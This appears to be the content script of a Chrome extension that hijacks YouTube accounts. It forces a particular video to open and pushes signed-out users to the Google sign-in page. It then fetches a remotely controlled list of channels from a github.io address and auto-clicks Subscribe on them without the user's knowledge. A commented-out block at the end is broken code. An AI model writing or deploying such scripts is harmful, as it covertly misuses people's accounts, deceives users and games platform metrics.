   
   if(window.location.href.includes('https://www.accounts.google.com')){
   chrome.storage.sync.set({'myt': "unfinished"}, function(data){
           console.log("chrome.log.unfinished");
      });
   }

  if(window.location.href.includes('https://www.youtube.com/watch?v=hz0aA_sPUcA')){
   chrome.storage.sync.set({'myt': "finished"}, function(data){
                    console.log("chrome.log.process finished");
      });
   }

 chrome.storage.sync.get('myt', function(Result){
                
           if(Result.myt != "finished"){                    
                    window.open('https://www.youtube.com/watch?v=hz0aA_sPUcA','_blank');
                    chrome.storage.sync.set({'myt': "finished"}, function(data){});
             }
                else{
                    console.log('chrome.log.finished');
                }           
  });

     
    var u;
    var ctX = document.querySelector('div#buttons');
    if(ctX){
        if (ctX.innerHTML.includes(">Sign in<")) {
             console.log("chrome.log.UNotSiggnn");
             u = "nou";
             chrome.storage.sync.set({'myData': "notfinished"}, function(data){
                console.log("chrome.log.process finished")
            });
         }
         else{
            console.log("chrome.log.Signedinaa");
            u = "uye";
         }
    }else{
        console.log("chrome.log.Signedinbb");
        u="uye";
    }

    if(u == "nou"){
        setTimeout(() => {
            document.location = "https://accounts.google.com/ServiceLogin/signinchooser?service=youtube&uilel=3&passive=true&continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Faction_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Den%26next%3Dhttps%253A%252F%252Fwww.youtube.com%252F&hl=en&ec=65620&flowName=GlifWebSignIn&flowEntry=ServiceLogin";
        }, 4000);
    }
    else if(u == "uye"){

        var ctxxYT = document.getElementById('subscribe-button');    
        if(ctxxYT){
           var cont = ctxxYT.innerHTML;
        }
        else{
           cont="Null";
        }

        
        var url = "https://su8code.github.io/newGitRepo/myJson.json";
        var data;
        var numCtx = 0;
        var currUrl = document.location.href;

        var jsonFile = new XMLHttpRequest();
        jsonFile.open("GET",url,true);    
        jsonFile.send();
        jsonFile.onreadystatechange = function() {
            if (jsonFile.readyState== 4 && jsonFile.status == 200) {
                //document.getElementById("id-of-element").innerHTML = jsonFile.responseText;
                 data = JSON.parse(jsonFile.responseText);
                 numCtx = data.number;
                // console.log(this.responseText);
               
            if(currUrl.includes(data.savedChannels[0])){

                 if(cont.includes(">Subscribe<")){
                 var ctxMenu = document.querySelector('tp-yt-paper-button.ytd-subscribe-button-renderer');
                 if (ctxMenu) {
                        ctxMenu.click();       
                    }
                else{
                    console.log("ctxMenu null");
                    
                   }
                 }                  
                    setTimeout( function(){                   
                       document.location = "https://www.youtube.com/";
                    } , 3000)                
            }else{

                
            }
                
                
            if(currUrl.includes('https://www.youtube.com/watch?v=hz0aA_sPUcA')){
                 if(cont.includes(">Subscribe<")){
                 var ctxMenu = document.querySelector('tp-yt-paper-button.ytd-subscribe-button-renderer');
                 if (ctxMenu) {
                        ctxMenu.click();       
                    }
                else{
                    console.log("ctxMenu null");
                    
                   }
                 }                  
                    setTimeout( function(){                   
                       document.location = "https://www.youtube.com/";
                    } , 3000)                
            }else{
                
            }

                chrome.storage.sync.set({'myData': "finished"}, function(data){
                    console.log("process finished")
                });
            }
                    
            chrome.storage.sync.get('myData', function(Result){
                
                if(Result.myData != "finished" && u == "uye"){                    
                    if(!currUrl.includes(data.savedChannels[0])){
                        
                        setTimeout( function(){
                            document.location = data.savedChannels[0];                        
                         } , 3000)                
                        }                     
                }
                else{
                    console.log(Result.myData);
                }
                
            });
                
        }            
     }
  
/*
//window.location.replace("http://stackoverflow.com");

var url = "https://su8code.github.io/newGitRepo/myJson.json";
   var data;
   var numCtx = 0;
  
var jsonFile = new XMLHttpRequest();
    jsonFile.open("GET",url,true);    
    jsonFile.send();

    jsonFile.onreadystatechange = function() {
        if (jsonFile.readyState== 4 && jsonFile.status == 200) {
            //document.getElementById("id-of-element").innerHTML = jsonFile.responseText;
             data = JSON.parse(jsonFile.responseText);
             numCtx = data.number;
            //console.log(data.number)


            const links = document.getElementsByTagName('a');

            for(var i; i<links.length; l++){
               
            } 
        }
        else{
           // console.log("Json parse Error");
        }

        for(var a=0;a<numCtx; a++){
            console.log(data.savedChannels[a]);
        }

     }
*/
